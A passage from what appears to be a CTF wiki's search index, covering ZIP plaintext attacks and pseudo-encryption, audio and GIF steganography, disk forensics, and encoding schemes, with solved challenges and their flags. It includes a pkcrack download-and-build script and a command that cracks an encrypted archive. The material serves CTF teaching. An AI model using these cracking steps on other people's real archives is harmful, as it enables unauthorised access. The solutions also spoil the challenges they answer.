Zippy"},{"location":"misc/archive/zip/#clear-text-attack","text":"","title":"Clear text attack"},{"location":"misc/archive/zip/#basics_1","text":"An encrypted compressed file A software to compress files, such as, 7z or zip , to view compressed file details. In Linux, you can use zipinfo -v to view the details, such as encryption algorithms, etc Know at least 12 bytes of contiguous content of a file of the archive If you already know part of the encrypted file, such as the readme.txt file found on a website, you can start trying to crack it. First, compress this plaintext file into a zip file. For example, readme.txt into readme.zip . Then, you need to confirm that the compression algorithm used by both is the same. A simple way to check is to open the file and see file is compressed with the same volume. If they are the same, it means the compression algorithm you are using is correct. If it is different, try another compression algorithm.","title":"Basics"},{"location":"misc/archive/zip/#ctf-example_1","text":"","title":"CTF Example"},{"location":"misc/archive/zip/#2015-guangzhou-strong-net-cup-burst","text":"Download the challenge file here First of all, the name of the challenge is burst . It is obvious we need to a cracking tool. First step, analyze the compressed file We see the file name is .zip . We extract the zip file and found there are two files, Desktop.zip and readme.txt respectively. Let's see the contents of readme.txt : After opening it, it shows qianwanbuyaogeixuanshoukandao!!! . In the Desktop.zip , there is a readme.txt , a answer folder with a key.txt file. The flag is probably in the key.txt file. Step 2, analyze the crack method We found that the extracted file and the Desktop.zip contain the same readme.txt file, where it's size is greater than 12 bytes . The CRC32 value of extracted readme.txt file is the same as the one in Desktop.zip . Base on that information, we can safely guess the extracted readme.txt file is the plaintext of encrypted readme.txt in Desktop.zip . Step 3, try plaintext attack Now that we know that it is a plaintext attack, we will crack the encrypted compressed file. Since the extracted readme.txt is the plaintext of readme.txt in the encrypted archive, compress readme.txt to a .zip file. We are going to use pkcrack , to install it save the following script to pkcrack-install.sh and run it to the current directory, giving it an execute permission. #!/bin/bash -ex wget https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz tar xzf pkcrack-1.2.2.tar.gz cd pkcrack-1.2.2/src make mkdir -p ../../bin cp extract findkey makekey pkcrack zipdecrypt ../../bin cd ../../ Then a folder of bin will be generated in the current directory. We will directly enter the bin folder and see the pkcrack file, which be used for cracking. ./pkcrack -c readme.txt -p readme.txt -C ~/download/misc/Desktop.zip -P ~/download/misc/readme.zip -d ~/decrypt.zip The parameter options we used are as follows: -C: target file to be cracked or encrypted file -c: name of ciphertext file within the encrypted file (readme.txt in Desktop.zip) -P: compressed plaintext file -p: name of the plaintext file in the compressed plaintext file (that is, the location of readme.txt in readme.zip) -d: name of the output decrypted zip file For other options see ./pkcrack --help The results after decryption are as follows: We can see that we started running at 1:10 in the afternoon and solved the secret key in the afternoon at 3:27 . So, the cracking can take a bit. flag: flag{7ip_Fi13_S0m3tim3s_s0_3a5y@}","title":"2015 Guangzhou Strong Net Cup - burst"},{"location":"misc/archive/zip/#pseudo-encryption","text":"","title":"Pseudo encryption"},{"location":"misc/archive/zip/#basics_2","text":"In the central directory in the ZIP format above, we emphasize there is 2 byte for the general-purpose bit flag. different bits have different meanings. Bit 0: If set, indicates that the file is encrypted. (For Method 6 - Imploding) Bit 1: If the compression method used was type 6, Imploding, then this bit, if set, indicates an 8K sliding dictionary was used. If clear, then a 4K sliding dictionary was used. ... Bit 6: Strong encryption. If this bit is set, you should set the version needed to extract value to at least 50 and you must also set bit 0. If AES encryption is used, the version needed to extract value must be at least 51. ... In 010Editor we tried to modify this general purpose bit from 0 --> 1 . Open the file again, it now requires a password. Modify pseudo-encryption method: Modify the general purpose bit in hex binwalk -e ignores pseudo encryption In the Mac OS and some Linux (such as Kali ), you can open the pseudo-encrypted ZIP Detect pseudo-encrypted with ZipCenOp.jar tool Sometimes you can use WinRar 's repair feature","title":"Basics"},{"location":"misc/archive/zip/#references","text":"https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html http://bobao.360.cn/ctf/detail/197.html","title":"References"},{"location":"misc/audio/introduction/","text":"The audio-related CTF challenges mainly use steganography techniques, involving MP3, LSB, waveform, spectrum steganography. Common Method \u00b6 Finding and extracting information using binwalk and strings commands, details are not converted. MP3 Steganography \u00b6 Basics \u00b6 MP3 steganography is using the MP3stego tool to hide information. The basic introduction and usage are as follows: MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream. encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 decode -X -P pass svega_stego.mp3 CTF Example \u00b6 ISCC-2016: Music Never Sleep \u00b6 After the initial observation, no flag was found with strings and the audio was normal. so steganography tool was likely used to hide the flag. After decoding using Mp3Stego with the password found earlier. decode.exe -X ISCC2016.mp3 -P bfsiscc2016 We got the file iscc2016.mp3.txt : Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ??? After decoding the encoded string from base64 and base32, we got the flag. Waveform \u00b6 Basics \u00b6 --..----.----. Generally speaking, we want to observe the waveform pattern of an audio file to find something strange. We can use tools like Audacity or Adobe Audition to do that. After the waveform pattern, see if you can convert part of the waveform into binary strings (1s and 0s). See CTF Example \u00b6 ISCC-2017: Misc-04 \u00b6 In fact, the hidden information in this challenge is in the first part of the audio. If you don't listen carefully, you may mistake it for steganography. Download the challenge here The high is 1, and the low is 0, representing a binary string (1s and 0s). 110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101 Convert to ASCII. Note that one group of binary must be 7 bits because the length of the binary string is 105, it can't divide into 8 bits evenly (105 mod 8 is 1), however, it does divide into 7 (105 mod 7 is 0). Spectrum \u00b6 Basics \u00b6 Spectrum stenography is hiding strings in the audio spectrum. One distant feature is that it often contains noisy or harsh sounds. CTF Example \u00b6 Su CTF Quals 2014: hear_with_your_eyes \u00b6 Download the challenge here Open the audio in Audacity and view the spectrogram. LSB Audio Steganography \u00b6 Basics \u00b6 Similar to LSB in image steganography, you can also perform LSB steganography in audio. we can use the SilentEye tool to solve audio LSB challenges. Description of SilentEye: SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system. 2015 GDQWB: Little Apple \u00b6 Just use slienteye 's decode feature. Related CTFs and Resources \u00b6 LSB in Audio - DerbyCon CTF Manchester code - Wikipedia","title":"Audio Steganography"},{"location":"misc/audio/introduction/#common-method","text":"Finding and extracting information using binwalk and strings commands, details are not converted.","title":"Common Method"},{"location":"misc/audio/introduction/#mp3-steganography","text":"","title":"MP3 Steganography"},{"location":"misc/audio/introduction/#basics","text":"MP3 steganography is using the MP3stego tool to hide information. The basic introduction and usage are as follows: MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream. encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 decode -X -P pass svega_stego.mp3","title":"Basics"},{"location":"misc/audio/introduction/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/audio/introduction/#iscc-2016-music-never-sleep","text":"After the initial observation, no flag was found with strings and the audio was normal. so steganography tool was likely used to hide the flag. After decoding using Mp3Stego with the password found earlier. decode.exe -X ISCC2016.mp3 -P bfsiscc2016 We got the file iscc2016.mp3.txt : Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ??? After decoding the encoded string from base64 and base32, we got the flag.","title":"ISCC-2016: Music Never Sleep"},{"location":"misc/audio/introduction/#waveform","text":"","title":"Waveform"},{"location":"misc/audio/introduction/#basics_1","text":"--..----.----. Generally speaking, we want to observe the waveform pattern of an audio file to find something strange. We can use tools like Audacity or Adobe Audition to do that. After the waveform pattern, see if you can convert part of the waveform into binary strings (1s and 0s). See","title":"Basics"},{"location":"misc/audio/introduction/#ctf-example_1","text":"","title":"CTF Example"},{"location":"misc/audio/introduction/#iscc-2017-misc-04","text":"In fact, the hidden information in this challenge is in the first part of the audio. If you don't listen carefully, you may mistake it for steganography. Download the challenge here The high is 1, and the low is 0, representing a binary string (1s and 0s). 110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101 Convert to ASCII. Note that one group of binary must be 7 bits because the length of the binary string is 105, it can't divide into 8 bits evenly (105 mod 8 is 1), however, it does divide into 7 (105 mod 7 is 0).","title":"ISCC-2017: Misc-04"},{"location":"misc/audio/introduction/#spectrum","text":"","title":"Spectrum"},{"location":"misc/audio/introduction/#basics_2","text":"Spectrum stenography is hiding strings in the audio spectrum. One distant feature is that it often contains noisy or harsh sounds.","title":"Basics"},{"location":"misc/audio/introduction/#ctf-example_2","text":"","title":"CTF Example"},{"location":"misc/audio/introduction/#su-ctf-quals-2014-hear_with_your_eyes","text":"Download the challenge here Open the audio in Audacity and view the spectrogram.","title":"Su CTF Quals 2014: hear_with_your_eyes"},{"location":"misc/audio/introduction/#lsb-audio-steganography","text":"","title":"LSB Audio Steganography"},{"location":"misc/audio/introduction/#basics_3","text":"Similar to LSB in image steganography, you can also perform LSB steganography in audio. we can use the SilentEye tool to solve audio LSB challenges. Description of SilentEye: SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"Basics"},{"location":"misc/audio/introduction/#2015-gdqwb-little-apple","text":"Just use slienteye 's decode feature.","title":"2015 GDQWB: Little Apple"},{"location":"misc/audio/introduction/#related-ctfs-and-resources","text":"LSB in Audio - DerbyCon CTF Manchester code - Wikipedia","title":"Related CTFs and Resources"},{"location":"misc/disk-memory/introduction/","text":"Common tools \u00b6 EasyRecovery MedAnalyze FTK Volatility Disk \u00b6 Common disk partition formats are as follows Windows: FAT12 -> FAT16 -> FAT32 -> NTFS Linux: EXT2 -> EXT3 -> EXT4 FAT file structure | Boot Sector | File Allocation Table | Root Directory | File Data Region Delete file: The first byte of the file name in the directory table is e5 . VMDK \u00b6 VMDK files are essentially a virtual version of the physical hard disk. It can also exist with the physical hard disk partition and sector of similar filled areas. We can use these filled areas to hide data. You can avoid the hidden files increasing the size of the VMDK files and virtual machine errors that may result from changes in the size of VMDK files. Also, VMDK files are generally large, so it\u2019s suitable for hiding large files. RAM \u00b6 Analyze Windows / Linux / Mac OS X memory structure Analyze processes, memory data Use the given challenge prompt to extract specific memory data for the specified process. CTF Example \u00b6 2018 Net Ding Cup - clip \u00b6 Download the challenge file here Through the 010 hex editor , you can see that the header of the file contains the word cloop. After searching, we found that this is an old linux-compressed device. The problem is that the device is damaged, so we will find a normal one. To compress to get a cloop file, we can run the following command mkisofs -r test | create_compressed_fs - 65536 > test.cloop Refer here to compress the file, then we found errors within the file header in the damaged file and fixed it. Here is how to extract files from the cloop file: extract_compressed_fs test.cloop now See here for more information. We got an ext4 type file. Next, we need to find a way to get the contents of this file system. \u279c losetup -d /dev/loop0 losetup: /dev/loop0: detach failed: Permission denied \u279c sudo losetup -d /dev/loop0 \u279c sudo losetup /dev/loop0 now losetup: now: failed to set up loop device: Device or resource busy \u279c sudo losetup /dev/loop0 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now losetup: /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now: failed to set up loop device: Device or resource busy \u279c losetup -f / dev / loop10 \u279c sudo losetup /dev/loop10 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now \u279c sudo mount /dev/loop10 /mnt/now \u279c cd /mnt/now \u279c ls clip-clip.png clip-clop.png clop-clip.png clop-clop.jpg flag.png The final step is to fix the flag.png header, where some bytes are missing. Flag: flag{0b008070-eb72-4b99-abed-092075d72a40}","title":"Introduction"},{"location":"misc/disk-memory/introduction/#common-tools","text":"EasyRecovery MedAnalyze FTK Volatility","title":"Common tools"},{"location":"misc/disk-memory/introduction/#disk","text":"Common disk partition formats are as follows Windows: FAT12 -> FAT16 -> FAT32 -> NTFS Linux: EXT2 -> EXT3 -> EXT4 FAT file structure | Boot Sector | File Allocation Table | Root Directory | File Data Region Delete file: The first byte of the file name in the directory table is e5 .","title":"Disk"},{"location":"misc/disk-memory/introduction/#vmdk","text":"VMDK files are essentially a virtual version of the physical hard disk. It can also exist with the physical hard disk partition and sector of similar filled areas. We can use these filled areas to hide data. You can avoid the hidden files increasing the size of the VMDK files and virtual machine errors that may result from changes in the size of VMDK files. Also, VMDK files are generally large, so it\u2019s suitable for hiding large files.","title":"VMDK"},{"location":"misc/disk-memory/introduction/#ram","text":"Analyze Windows / Linux / Mac OS X memory structure Analyze processes, memory data Use the given challenge prompt to extract specific memory data for the specified process.","title":"RAM"},{"location":"misc/disk-memory/introduction/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/disk-memory/introduction/#2018-net-ding-cup-clip","text":"Download the challenge file here Through the 010 hex editor , you can see that the header of the file contains the word cloop. After searching, we found that this is an old linux-compressed device. The problem is that the device is damaged, so we will find a normal one. To compress to get a cloop file, we can run the following command mkisofs -r test | create_compressed_fs - 65536 > test.cloop Refer here to compress the file, then we found errors within the file header in the damaged file and fixed it. Here is how to extract files from the cloop file: extract_compressed_fs test.cloop now See here for more information. We got an ext4 type file. Next, we need to find a way to get the contents of this file system. \u279c losetup -d /dev/loop0 losetup: /dev/loop0: detach failed: Permission denied \u279c sudo losetup -d /dev/loop0 \u279c sudo losetup /dev/loop0 now losetup: now: failed to set up loop device: Device or resource busy \u279c sudo losetup /dev/loop0 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now losetup: /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now: failed to set up loop device: Device or resource busy \u279c losetup -f / dev / loop10 \u279c sudo losetup /dev/loop10 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now \u279c sudo mount /dev/loop10 /mnt/now \u279c cd /mnt/now \u279c ls clip-clip.png clip-clop.png clop-clip.png clop-clop.jpg flag.png The final step is to fix the flag.png header, where some bytes are missing. Flag: flag{0b008070-eb72-4b99-abed-092075d72a40}","title":"2018 Net Ding Cup - clip"},{"location":"misc/encode/communication/","text":"Phone Dialing Code \u00b6 Phone Keypad Cipher - dcode.fr Morse Encoding \u00b6 Morse Code - Wikipedia Morse code table: Features \u00b6 Contains only . and - . Maximum of 6 digits. It can also be represented by the 01 string. Tools \u00b6 Morse Code Converter Tap Code \u00b6 Tap code is a simple way to encode the text. Tap code is based on a 5 \u00d75 square Polybius square, but the difference is that letter K is combined with the letter C. Tap Code 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z Example: Letter F O X Position 2,1 3,4 5,3 Tap Code .. . ... .... ..... ... Manchester Code \u00b6 Manchester Code - Wikipedia Gray Code \u00b6 Gray Code - Wikipedia","title":"Encoding Used in Communication"},{"location":"misc/encode/communication/#phone-dialing-code","text":"Phone Keypad Cipher - dcode.fr","title":"Phone Dialing Code"},{"location":"misc/encode/communication/#morse-encoding","text":"Morse Code - Wikipedia Morse code table:","title":"Morse Encoding"},{"location":"misc/encode/communication/#features","text":"Contains only . and - . Maximum of 6 digits. It can also be represented by the 01 string.","title":"Features"},{"location":"misc/encode/communication/#tools","text":"Morse Code Converter","title":"Tools"},{"location":"misc/encode/communication/#tap-code","text":"Tap code is a simple way to encode the text. Tap code is based on a 5 \u00d75 square Polybius square, but the difference is that letter K is combined with the letter C. Tap Code 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z Example: Letter F O X Position 2,1 3,4 5,3 Tap Code .. . ... .... ..... ...","title":"Tap Code"},{"location":"misc/encode/communication/#manchester-code","text":"Manchester Code - Wikipedia","title":"Manchester Code"},{"location":"misc/encode/communication/#gray-code","text":"Gray Code - Wikipedia","title":"Gray Code"},{"location":"misc/encode/computer/","text":"This section describes the different encoding used by a computer. Alphabet Encoding \u00b6 A-Z or a-z corresponds to 1-26 or 0-25 Tools \u00b6 Letter Numbers Converter ASCII encoding \u00b6 Features \u00b6 We use ASCII encoding for printable characters, such as the following: 0-9, 49-57 A-Z, 65-90 a-z, 97-122 ASCII Conversion \u00b6 Binary \u00b6 Convert ASCII decimal to binary representation. Only contains 0 and 1 No more than 8 bits, 7 bits are also possible because printable characters are up to 127 Actually just another form of ASCII code Hexadecimal \u00b6 Convert letters to ASCII hexadecimal representation. A-Z \u2192 41-5a a-z \u2192 61-7a Tools \u00b6 ASCII,Hex,Binary,Decimal,Base64 Converter CTF Example \u00b6 2018 DEFCON Quals - Ghettohackers: Throwback \u00b6 The challenge details: Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem! Here we split the given string by ! mark, then the length of each string corresponds to a letter. For example, length 1 = a, length 2 = b, and so on. ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!' sp = ori . split ( '!' ) # split original text by ! print ( '' . join ( chr ( 97 + len ( s ) - 1 ) if s else ' ' for s in sp )) # get length of each word and add offset, then convert it to letter with chr() We assumed that 0 characters are spaces because it makes the flag readable. The flag is: dark logic Base Encoding \u00b6 the xx in base xx indicates how many characters are used for encoding. For example, base64 uses 64 characters to encode since 2 to the sixth power is 64, each 6 bit is an element that corresponds to a printable character. Three bytes have 24 bits, corresponding to four Base64 elements, so three bytes are needed to represent four printable characters. The printable characters in Base64 include the letters A-Z, a-z, numbers 0-9 that are 62 characters and two printable characters differ in different systems. Base64 - Wikipedia . Encoding the word man : If the numbers of bytes are not divisible by 3, there will be 1 or 2 extra bytes at the end. Fill the remaining with value 0 at the end so that it can be divisible by 3, then encode to base64. After it's encoded to base64, you need to add one or two = at the end. When there are 8 bits (one byte) remaining and the last 6 base64 bits contain four values of 0 , you need to add two = at the end. When there are two bytes remaining and the last 6 base64 bits contain two values of 0 , you need to add one = at the end. Refer to the table below: Because the zero paddings are not used in operation, hidden information can be stored there. Similar to base64, base32 uses 32 characters to encode since 2 to the fifth power is 32, each 5 bit is an element that corresponds to a printable character. - If there are less than 5 bit, fill it with 0 at the end. - Fill the remaining with = until there are 5 bytes. - Base32 can have up to six = at the end. Refer to the table below: Features \u00b6 Base64 can have = at the end, but two maximum. Base64 can have = at the end, but six maximum. Characters set differ from different bases. It may be necessary to manually add = sign = is also 3d (in hex) For more details, see Base RFC Tools \u00b6 Base64 Decode Base64 Encode Python base64 library functions Steganographic Script Example \u00b6 The challenge details can be found in the data.txt file on here Use a script to read steganographic information: import base64 def deStego ( stegoFile ): b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" with open ( stegoFile , 'r' ) as stegoText : message = \"\" for line in stegoText : try : text = line [ line . index ( \"=\" ) - 1 : - 1 ] message += \"\" . join ([ bin ( 0 if i == '=' else b64table . find ( i ))[ 2 :] . zfill ( 6 ) for i in text ])[ 2 if text . count ( '=' ) == 2 else 4 : 6 ] except : pass return \"\" . join ([ chr ( int ( message [ i : i + 8 ], 2 )) for i in range ( 0 , len ( message ), 8 )]) print ( deStego ( \"text.txt\" )) Output: flag{BASE64_i5_amaz1ng} Huffman Coding \u00b6 See Hoffman Coding - Wikipedia XXencoding \u00b6 XXencode encodes the input text in units of three bytes. If the final remaining data is less than three bytes, the missing parts are filled out with zeros. These three bytes have 24 bits in total, divided into four groups of 6 bits, each of which is represented in decimal terms with values that only fall between 0 and 63. Replace the position character of the corresponding value. 1 2 3 4 5 6 0123456789012345678901234567890123456789012345678901234567890123 | | | | | | | +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz See Xxencoding - Wikipedia Features \u00b6 only contains numbers and uppercase/lowercase letters - sign, - sign Tools \u00b6 Xxencoding Converter URL Encoding \u00b6 See URL Encoding - Wikipedia Features \u00b6 Many % sign Unicode Encoding \u00b6 See Unicode - Wikipedia Note that it can take four different forms Example \u00b6 Source text: The &#x [Hex]: &#x0054;&#x0068;&#x0065; &# [Decimal]: &#00084;&#00104;&#00101; \\U [Hex]: \\U0054\\U0068\\U0065 \\U+ [Hex]: \\U+0054\\U+0068\\U+0065","title":"Encoding Used in Computing"},{"location":"misc/encode/computer/#alphabet-encoding","text":"A-Z or a-z corresponds to 1-26 or 0-25","title":"Alphabet Encoding"},{"location":"misc/encode/computer/#tools","text":"Letter Numbers Converter","title":"Tools"},{"location":"misc/encode/computer/#ascii-encoding","text":"","title":"ASCII encoding"},{"location":"misc/encode/computer/#features","text":"We use ASCII encoding for printable characters, such as the following: 0-9, 49-57 A-Z, 65-90 a-z, 97-122","title":"Features"},{"location":"misc/encode/computer/#ascii-conversion","text":"","title":"ASCII Conversion"},{"location":"misc/encode/computer/#binary","text":"Convert ASCII decimal to binary representation. Only contains 0 and 1 No more than 8 bits, 7 bits are also possible because printable characters are up to 127 Actually just another form of ASCII code","title":"Binary"},{"location":"misc/encode/computer/#hexadecimal","text":"Convert letters to ASCII hexadecimal representation. A-Z \u2192 41-5a a-z \u2192 61-7a","title":"Hexadecimal"},{"location":"misc/encode/computer/#tools_1","text":"ASCII,Hex,Binary,Decimal,Base64 Converter","title":"Tools"},{"location":"misc/encode/computer/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/encode/computer/#2018-defcon-quals-ghettohackers-throwback","text":"The challenge details: Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem! Here we split the given string by ! mark, then the length of each string corresponds to a letter. For example, length 1 = a, length 2 = b, and so on. ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!' sp = ori . split ( '!' ) # split original text by ! print ( '' . join ( chr ( 97 + len ( s ) - 1 ) if s else ' ' for s in sp )) # get length of each word and add offset, then convert it to letter with chr() We assumed that 0 characters are spaces because it makes the flag readable. The flag is: dark logic","title":"2018 DEFCON Quals - Ghettohackers: Throwback"},{"location":"misc/encode/computer/#base-encoding","text":"the xx in base xx indicates how many characters are used for encoding. For example, base64 uses 64 characters to encode since 2 to the sixth power is 64, each 6 bit is an element that corresponds to a printable character. Three bytes have 24 bits, corresponding to four Base64 elements, so three bytes are needed to represent four printable characters. The printable characters in Base64 include the letters A-Z, a-z, numbers 0-9 that are 62 characters and two printable characters differ in different systems. Base64 - Wikipedia . Encoding the word man : If the numbers of bytes are not divisible by 3, there will be 1 or 2 extra bytes at the end. Fill the remaining with value 0 at the end so that it can be divisible by 3, then encode to base64. After it's encoded to base64, you need to add one or two = at the end. When there are 8 bits (one byte) remaining and the last 6 base64 bits contain four values of 0 , you need to add two = at the end. When there are two bytes remaining and the last 6 base64 bits contain two values of 0 , you need to add one = at the end. Refer to the table below: Because the zero paddings are not used in operation, hidden information can be stored there. Similar to base64, base32 uses 32 characters to encode since 2 to the fifth power is 32, each 5 bit is an element that corresponds to a printable character. - If there are less than 5 bit, fill it with 0 at the end. - Fill the remaining with = until there are 5 bytes. - Base32 can have up to six = at the end. Refer to the table below:","title":"Base Encoding"},{"location":"misc/encode/computer/#features_1","text":"Base64 can have = at the end, but two maximum. Base64 can have = at the end, but six maximum. Characters set differ from different bases. It may be necessary to manually add = sign = is also 3d (in hex) For more details, see Base RFC","title":"Features"},{"location":"misc/encode/computer/#tools_2","text":"Base64 Decode Base64 Encode Python base64 library functions Steganographic Script","title":"Tools"},{"location":"misc/encode/computer/#example","text":"The challenge details can be found in the data.txt file on here Use a script to read steganographic information: import base64 def deStego ( stegoFile ): b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" with open ( stegoFile , 'r' ) as stegoText : message = \"\" for line in stegoText : try : text = line [ line . index ( \"=\" ) - 1 : - 1 ] message += \"\" . join ([ bin ( 0 if i == '=' else b64table . find ( i ))[ 2 :] . zfill ( 6 ) for i in text ])[ 2 if text . count ( '=' ) == 2 else 4 : 6 ] except : pass return \"\" . join ([ chr ( int ( message [ i : i + 8 ], 2 )) for i in range ( 0 , len ( message ), 8 )]) print ( deStego ( \"text.txt\" )) Output: flag{BASE64_i5_amaz1ng}","title":"Example"},{"location":"misc/encode/computer/#huffman-coding","text":"See Hoffman Coding - Wikipedia","title":"Huffman Coding"},{"location":"misc/encode/computer/#xxencoding","text":"XXencode encodes the input text in units of three bytes. If the final remaining data is less than three bytes, the missing parts are filled out with zeros. These three bytes have 24 bits in total, divided into four groups of 6 bits, each of which is represented in decimal terms with values that only fall between 0 and 63. Replace the position character of the corresponding value. 1 2 3 4 5 6 0123456789012345678901234567890123456789012345678901234567890123 | | | | | | | +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz See Xxencoding - Wikipedia","title":"XXencoding"},{"location":"misc/encode/computer/#features_2","text":"only contains numbers and uppercase/lowercase letters - sign, - sign","title":"Features"},{"location":"misc/encode/computer/#tools_3","text":"Xxencoding Converter","title":"Tools"},{"location":"misc/encode/computer/#url-encoding","text":"See URL Encoding - Wikipedia","title":"URL Encoding"},{"location":"misc/encode/computer/#features_3","text":"Many % sign","title":"Features"},{"location":"misc/encode/computer/#unicode-encoding","text":"See Unicode - Wikipedia Note that it can take four different forms","title":"Unicode Encoding"},{"location":"misc/encode/computer/#example_1","text":"Source text: The &#x [Hex]: &#x0054;&#x0068;&#x0065; &# [Decimal]: &#00084;&#00104;&#00101; \\U [Hex]: \\U0054\\U0068\\U0065 \\U+ [Hex]: \\U+0054\\U+0068\\U+0065","title":"Example"},{"location":"misc/encode/modern/","text":"Barcode \u00b6 Graphic identifier representing a set of information, consisting of black bars and white spaces of unequal width, arranged according to different code formats International standards EAN-13 used to identify a specific retail product type, 13 digits Code 39 used in industrial applications, 39 characters Code 128 used in the health industry, blood banking, and electronics manufacture, 128 characters Online Barcode Reader QR code \u00b6 A black and white graphic that records the data symbol information according to certain rules with a specific geometric figure Recording data symbol information in a black and white pattern in a step-by-step manner with a certain geometry Stacked/Row QR Code: Code 16K, Code 49, PDF417 Matrix QR Code: QR Code","title":"Encoding Used in the Real World"},{"location":"misc/encode/modern/#barcode","text":"Graphic identifier representing a set of information, consisting of black bars and white spaces of unequal width, arranged according to different code formats International standards EAN-13 used to identify a specific retail product type, 13 digits Code 39 used in industrial applications, 39 characters Code 128 used in the health industry, blood banking, and electronics manufacture, 128 characters Online Barcode Reader","title":"Barcode"},{"location":"misc/encode/modern/#qr-code","text":"A black and white graphic that records the data symbol information according to certain rules with a specific geometric figure Recording data symbol information in a black and white pattern in a step-by-step manner with a certain geometry Stacked/Row QR Code: Code 16K, Code 49, PDF417 Matrix QR Code: QR Code","title":"QR code"},{"location":"misc/picture/gif/","text":"File Structure \u00b6 The file structure of a GIF file: File Header File Signature Version Number Data Stream Control Identifier Image Block Other Extension Blocks File Trailer A diagram for the structure of a GIF file: File header \u00b6 Signature and Version Number. The signature, which consists of three bytes GIF , is used to confirm whether a file is in GIF format. The file version number is also composed of three bytes, 87a or 89a . Logical Screen Descriptor \u00b6 The Logical Screen Descriptor is always located right after the header. This tells the decoder how big the image will be. It is exactly 7 bytes long. It starts with the canvas width and canvas height. Global Color Table \u00b6 The GIF format can have a global color table or local color tables for each sub-image. Each color table contains a list of RGB (Red, Green, Blue) color component intensities, for example, (255\uff0c0\uff0c0) represents red. Image Descriptor \u00b6 A single GIF file may contain multiple images. In the original GIF rendering model, these were meant to be composited onto a larger virtual canvas. Nowadays multiple images are normally used for animations. Each image begins with an image descriptor block, which is exactly 10 bytes long. Image Data \u00b6 Finally, we get to the actual image data. The image data is composed of a series of output codes that tell the decoder which colors to emit to the canvas. These codes are combined into the bytes that make up the block. File Trailer \u00b6 The trailer block indicates when you've reached the end of the file. It is always a byte 3B . For more details, see what is in a GIF CTF Examples \u00b6 WDCTF-2017:3-2 \u00b6 The animation in GIFs is made up of a sequence of frames, each frame can be an image that contains hidden information. You can use the convert command to separate each frame in the GIF file. Run this command to split each frame of the GIF file: ffmpeg -i cake.gif cake-%d.png After opening and separating each frame of the GIF image, it's clear that each frame was a part of a QR code, so let's combine the frames into a complete QR code using Python . from PIL import Image flag = Image . new ( \"RGB\" ,( 450 , 450 )) for i in range ( 2 ): for j in range ( 2 ): pot = \"cake- {} .png\" . format ( j + i * 2 + 1 ) potImage = Image . open ( pot ) crop = potImage . crop ((( j * 225 , i * 225 , ( j + 1 ) * 225 , ( i + 1 ) * 225 ))) flag . paste ( crop , ( j * 225 , i * 225 )) flag . save ( './flag.png' ) After scanning the QR code, you get a string of hexadecimal strings. 03f30d0ab8c1aa5 .... 74080006030908 The beginning 03f3 is the header of a pyc file, restore it to python executable, and run it to get the flag. Here is the decompiled code using uncompyle6: # uncompyle6 version 3.7.4 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)] # Embedded file name: /home/ctf/bbb.py # Compiled at: 2017-09-02 09:35:36 import random key = 'ctf' strr = '186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43' def func1 ( str1 , key ): random . seed ( key ) str2 = '' for c in str1 : str2 += str ( ord ( c ) ^ random . randint ( 0 , 255 )) + ',' str2 = str2 . strip ( ',' ) return str2 def func2 ( str2 , key ): random . seed ( key ) str1 = '' for i in str2 . split ( ',' ): i = int ( i ) n = random . randint ( 0 , 255 ) str1 += chr ( i ^ n ) print ( n ) return str1 print ( func2 ( strr , key )) Note Run the script using Python2 python2.7 bbb.py flag { U_r_Greatt! } XMAN-2017:100.gif \u00b6 Download the challenge here The time interval between each frame of a GIF file can also be used to hide information. By using the identify command, we printed the time interval of each frame. $ identify -format \"%s %T \\n\" 100 .gif 0 66 1 66 2 20 3 10 4 20 5 10 6 10 7 20 8 20 9 20 10 20 